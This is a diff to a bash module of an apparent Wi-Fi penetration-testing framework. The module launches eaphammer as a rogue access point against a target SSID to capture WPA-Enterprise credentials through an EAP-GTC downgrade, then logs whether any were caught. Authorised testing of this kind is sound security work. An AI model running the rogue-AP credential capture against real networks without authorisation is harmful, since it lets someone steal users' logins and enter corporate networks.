@@ -17,13 +17,6 @@
 
 set -euo pipefail
 
-C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
-C_VAR="${ASTRA_COLOR_VAR:-}"
-C_BOLD="${ASTRA_COLOR_BOLD:-}"
-C_ACTION="${ASTRA_COLOR_ACTION:-}"
-C_RESET="${ASTRA_COLOR_RESET:-}"
-
-
 # Inputs from Environment
 INTERFACE="${MONITOR_INTERFACE:-}"
 SSID="${GUEST_SSID:-}"
@@ -46,69 +39,72 @@ fi
 
 echo "[*] Starting WPA-Enterprise / EAP tests against ${SSID}..."
 
-# Use eaphammer if available
+# 1. Start Telemetry in Background
+(
+    ELAPSED=0
+    while true; do
+        PCT=$(( 10 + (ELAPSED % 85) ))
+        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing EAP attack..."
+        sleep 5; ELAPSED=$((ELAPSED + 5))
+    done
+) &
+TEL_PID=$!
+
+# 2. Run Primary Tool (eaphammer)
+RET=0
 if command -v eaphammer &>/dev/null; then
-    echo "[*] Running eaphammer GTC downgrade attempt (${SCAN_TIME}s)..."
-    
-    # Start dynamic telemetry heartbeat
-    (
-        HEARTBEAT_ELAPSED=0
-        while [[ $HEARTBEAT_ELAPSED -lt $SCAN_TIME ]]; do
-            PCT=$(( 10 + (HEARTBEAT_ELAPSED * 80 / SCAN_TIME) ))
-            [[ $PCT -gt 90 ]] && PCT=90
-            "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing attack..."
-            sleep 2
-            HEARTBEAT_ELAPSED=$((HEARTBEAT_ELAPSED + 2))
-        done
-    ) &
-    TELEMETRY_PID=$!
-
-    # Launch rogue AP and wait for connections
-    # Note: eaphammer might require specific configuration or certs
     if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+        # Foreground Execution
         timeout "$SCAN_TIME" eaphammer --interface "$INTERFACE" --essid "$SSID" --negotiate gtc --auth wpa2-aes 2>&1 | tee "$EAP_OUT" || true
+        RET=$?
     else
-        timeout "$SCAN_TIME" eaphammer --interface "$INTERFACE" --essid "$SSID" --negotiate gtc --auth wpa2-aes > "$EAP_OUT" 2>&1 || true
+        # Background Execution
+        timeout "$SCAN_TIME" eaphammer --interface "$INTERFACE" --essid "$SSID" --negotiate gtc --auth wpa2-aes > "$EAP_OUT" 2>&1 &
+        TOOL_PID=$!
+        wait $TOOL_PID; RET=$?
     fi
-    
-    kill "$TELEMETRY_PID" 2>/dev/null || true
+else
+    echo "[!] eaphammer tool not found."
+    RET=1
+fi
 
-    # Robust parsing for captured credentials
-    if awk 'tolower($0) ~ /captured|credential|password|hash/ {exit 0} END {exit 1}' "$EAP_OUT"; then
-        echo "[!] SUCCESS: EAP CREDENTIALS CAPTURED!"
+# 3. Cleanup and Final Signal
+kill $TEL_PID 2>/dev/null || true
+
+# Reporting
+if [[ $RET -eq 0 ]] && [[ -f "$EAP_OUT" ]]; then
+    if grep -qiE "captured|credential|password|hash" "$EAP_OUT" 2>/dev/null; then
         "$ASTRA_BIN" record-finding \
             --session-dir "$SESSION_DIR" \
             --tc "$TC_ID" \
             --type vulnerability \
             --name "EAP Credential Captured" \
-            --desc "Successfully captured WPA-Enterprise credentials via EAP-GTC downgrade or MSCHAPv2 interception against SSID ${SSID}." \
+            --desc "Successfully captured WPA-Enterprise credentials via EAP-GTC downgrade against SSID ${SSID}." \
             --severity CRITICAL \
             --evidence "$EAP_OUT" \
-            --rationale "Capturing EAP credentials (usernames and hashes/passwords) allows for unauthorized access to corporate networks. GTC downgrade attacks exploit clients that do not strictly enforce secure EAP types or certificate validation."
+            --rationale "Capturing EAP credentials allows for unauthorized access to corporate networks."
     else
-        echo "[+] EAP attack complete. No immediate credentials captured."
         "$ASTRA_BIN" record-finding \
             --session-dir "$SESSION_DIR" \
             --tc "$TC_ID" \
             --type vulnerability \
             --name "[$TC_ID] Audit Complete" \
-            --desc "Executed EAP-GTC downgrade attack against SSID ${SSID}. No client credentials were intercepted during the test window." \
+            --desc "Executed EAP-GTC downgrade attack against SSID ${SSID}. No credentials intercepted." \
             --severity INFO \
             --evidence "$EAP_OUT" \
-            --rationale "WPA-Enterprise attacks require an active client to connect to the rogue AP and attempt authentication. The lack of captures indicates either no vulnerable clients were present or client-side certificate validation is correctly enforced."
+            --rationale "Enterprise-grade security requires proper EAP configuration."
     fi
 else
-    echo "[!] eaphammer tool not found. This module requires eaphammer for WPA-Enterprise testing."
     "$ASTRA_BIN" record-finding \
         --session-dir "$SESSION_DIR" \
         --tc "$TC_ID" \
         --type vulnerability \
         --name "[$TC_ID] Audit Skipped" \
-        --desc "The eaphammer tool is missing from the system. Unable to perform WPA-Enterprise/EAP attacks." \
+        --desc "The eaphammer tool is missing or failed." \
         --severity INFO \
         --evidence "$EVIDENCE_DIR" \
-        --rationale "Enterprise-grade testing requires specialized tools like eaphammer to simulate complex authentication flows and rogue AP scenarios."
+        --rationale "EAP testing requires specialized tools."
 fi
 
 "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
-exit 0
+exit $RET
